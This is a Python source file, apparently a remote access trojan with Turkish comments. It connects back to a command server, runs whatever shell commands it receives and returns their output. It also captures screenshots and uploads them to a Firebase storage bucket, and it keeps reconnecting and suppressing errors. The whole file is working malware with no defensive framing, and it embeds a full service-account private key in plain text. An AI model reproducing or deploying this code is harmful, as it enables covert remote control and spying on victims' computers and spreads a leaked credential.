import socket
import subprocess
import os
import pyautogui
import firebase_admin
from firebase_admin import credentials
from firebase_admin import storage
import shlex


HOST = '127.0.0.1'  # Sunucu IP adresi (localhost)
PORT = 8080  # Sunucu port numarası

shell = {
  "type": "service_account",
  "project_id": "shell-8310e",
  "private_key_id": "099117afedf74f239f0953d93e67ed9c4de771d0",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDlc03SZZftIEys\nuJ4h1AdMmJFkUIKlUy/TASagJ2YYoPXBH2gLl2iZa45fzRhnEka7VEsOAm8g+3YK\nabUhmbY8z9gbRdJlw4vRlEVU0jDe5xn3HkEPdMjYTIhyZtEfsgGBW7vs2A+OW7rf\nW/XLZ+XJQx0cRpGaQHs0O4WNa8ri7MnVkBcnwUR/gwjdo8VUSg/e83J+hW554dVF\nTWt73ddWUemb4PwivOxJ9wqel9SqNh+uqTNoUYDIIo3CvBIpbi/UXjTLZ/g3Qax5\n53j3SLTfRsnpk9G508mQ2K47SmFIJRTpVGIXJJbZoEdflbA2LbWCgliHlRh7sg22\n1BD+/VNzAgMBAAECggEAHVjkcO8E7JO/Wtl42FN55NvKv4LmAuajQktuY6Obv7YE\nA4HUg/myAOrXLf0EjFezwPgPatOi38a/RVEElYSci3tQum7xcd9TUyiyFB7s7fBZ\ny4K3cuukA2Oz5rYB32+cGQM2WR0VeEbWna+caOTOvjGdrTqAGwj4+ShNH6vUKmE9\niXwUs6f6kNWMhJxz6kWE4c4eqq2USaRZe04zsp2hAQtHVaSPhljFoiZ62quC7Pb0\nSgDuYQkbknZyHUND7AwMthOJ4OoRrO9R6QlJXym2ZnTnqQoMc/V0YOscGrAKLv9J\nFGwj10LgcSSpjv5vwwRWwcX4iIDb94uetgP2GFX+KQKBgQD6FnL7eCEq8Q/SdhEV\noJJ1XwBvQGWTfNihOGo28tk7RrLp/sRnh6WXfg4tPyLw31GXwXNMlebs8lSYE9aC\nHiVUvnQF0mFmqEcShsECDqeV6B5DkATexyqfxNo37jIfX/nOHhQTtYAlYwWso3/v\n2TnPPgzydINhKPmlvJjb3KzLDQKBgQDq3/TR07QRBWGR26sP120R7F4iUZI4XTVp\ncg6nadtXO58HFAI6qsekRncCiTbs63ZvZ2f/IhTXlkJxkGVG7lKtRWheIjnuA7HB\ny08xZSkUdFLxHvCaLUVLxEsGuQpixwdOyLrgkPAPaFae0TgWGLjsMvJmyGVkhp8C\nUcz5PtD4fwKBgBy4E0A5jWWHBVAf6tpW9DqyTDR6aq/DOIVbGydwP+4EsmsYrKlO\n9H8vJKWhiHusyYvp1TnIRRqUwY4tSQbsO1E+BcjdXf4R+QdxnhyEXk5it4b+tPB4\nYrayPnUJz4u209MNtTSGNU8VzgMDS5/ZjD/2WjpFkwjHUdPskok9EELJAoGBAKuR\n1yNjUvjQBnrmjOmwgtMB562ICpizta2GDKBMWlY5jiw8eHhkghtFAfBPTVj5k3VD\ngxtCyRjGgVi1ktWih7BcsCV7OPfdqP6YRgweCkkPw/qwkC7/fMwg4nFRv/1xx6vM\nQ36BQWrv2759tEun2YVondto7W/mSscF/AXh1gJ/AoGAbDALTMrcw9FojyP+YtXL\n9X2vOtwEr8WcpNiVrYJq0ifE/YW+wrAWPFN5d5wi8TZB6iAazLPqPWXOtqdCFVlX\ni8Eh83ova5+2qF4rVpoCk19PWf4KMUqclJrA/r6sBRiqeIC3qqFOn3MaIYG0gti6\nn+GqRABX7SXfXzjfMlAkoME=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-yk4a3@shell-8310e.iam.gserviceaccount.com",
  "client_id": "112458939318876326419",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-yk4a3%40shell-8310e.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

def photo():
    cred = credentials.Certificate(shell)
    firebase_admin.initialize_app(cred, {
        'storageBucket': 'shell-8310e.appspot.com'
    })

    def upload_file( file_path ):
        # Dosyayı yükleme
        bucket = storage.bucket()
        blob = bucket.blob("images/" + file_path)  # Firebase Storage içindeki yol
        blob.upload_from_filename(file_path)

    # Örnek dosya yükleme
    upload_file("photo/ph.png")

def exe(command):
    if command.startswith("cd"):
        comman = command.split()
        try:
            os.chdir(comman[1])
            return f"Change dir to {comman[1]}"
        except:
            return f"Can't find dir"
    elif command.startswith("screen"):
        try:
            subprocess.run("mkdir photo", shell=True, capture_output=True, text=True)
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save("photo/ph.png")
            photo()
            subprocess.run("rm -r photo", shell=True, capture_output=True, text=True)
            return "Took photo"
        except:
            return "Error"
    elif command.startswith("make"):
        comman = command.split()
        try:
            with open(comman[1],"a"):
                pass
            return "Created"
        except:
            return "Error"
    elif command.startswith("mkfolder"):
        comman = command.split()
        try:
            os.mkdir(comman[1])
            return f"Change create {comman[1]}"
        except:
            return f"Can't create dir"
    elif command.startswith("help"):
        return "\n"
    else:
        try:
            result =subprocess.run(
                shlex.split(command),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=True
            )
            return result.stdout  # Komut çalıştırılabilir
        except subprocess.CalledProcessError:
            return "Error"  # Komut çalıştırılamaz
        except FileNotFoundError:
            return "Error"
def connecting():
    try:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))

                while True:
                    command = s.recv(1024).decode()  # Sunucudan komutu al
                    if not command:
                        print(exit())
                        break
                        print(exit())

                    output = exe(command)

                    s.sendall(output.encode())  # Sunucuya sonucu gönder
    except ConnectionRefusedError:
        print()
    finally:
        connecting()
try:
    connecting()
except:
    print()
finally:
    connecting()